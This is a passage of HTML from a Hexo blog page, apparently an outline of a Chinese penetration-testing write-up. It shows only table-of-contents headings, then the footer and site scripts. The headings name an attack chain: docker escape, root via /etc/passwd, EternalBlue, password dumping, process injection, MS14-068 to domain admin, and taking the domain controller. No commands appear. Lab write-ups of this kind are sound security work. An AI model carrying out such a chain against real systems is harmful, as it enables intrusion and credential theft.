class="toc-article-text">docker逃逸（特权模式）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#getshell"><span class="toc-article-text">getshell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%A4%B1%E8%B4%A5%E6%80%9D%E8%B7%AF1-%E4%BF%AE%E6%94%B9-etc-passwd%E7%9B%B4%E6%8E%A5root-ssh"><span class="toc-article-text">失败思路1. 修改&#x2F;etc&#x2F;passwd直接root ssh</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%A4%B1%E8%B4%A5%E6%80%9D%E8%B7%AF2-%E6%8B%BF%E8%B5%B0%E7%A7%81%E9%92%A5%E6%96%87%E4%BB%B6%E7%9B%B4%E6%8E%A5ssh"><span class="toc-article-text">失败思路2. 拿走私钥文件直接ssh</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%88%90%E5%8A%9F%E6%80%9D%E8%B7%AF3-%E5%88%9B%E5%BB%BA%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%EF%BC%8Cssh%E4%B8%8A%E5%8E%BB%E5%86%8D%E6%8F%90%E5%8D%87%E5%88%B0root"><span class="toc-article-text">成功思路3. 创建普通用户，ssh上去再提升到root</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%8A%E7%BA%BFCS"><span class="toc-article-text">上线CS</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%90%AD%E5%BB%BAsocks%E4%BB%A3%E7%90%86"><span class="toc-article-text">搭建socks代理</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%86%85%E7%BD%91"><span class="toc-article-text">内网</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#fscan%E5%A4%A7%E4%BF%9D%E5%81%A5"><span class="toc-article-text">fscan大保健</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%8B%BF%E4%B8%8B%E7%94%A8%E6%88%B7%E6%9C%BA"><span class="toc-article-text">永恒之蓝拿下用户机</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1"><span class="toc-article-text">信息搜集</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-article-text">抓取密码</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#bloodhound"><span class="toc-article-text">bloodhound</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-article-text">进程注入</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%B8%8A%E7%BA%BFCS-1"><span class="toc-article-text">上线CS</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ms14-068%E6%8F%90%E5%8D%87%E8%87%B3%E5%9F%9F%E7%AE%A1"><span class="toc-article-text">ms14-068提升至域管</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ipc-sc%E5%B0%9D%E8%AF%95%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7"><span class="toc-article-text">ipc+sc尝试拿下域控</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ipc-at%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7"><span class="toc-article-text">ipc+at拿下域控</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 X1NRI's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
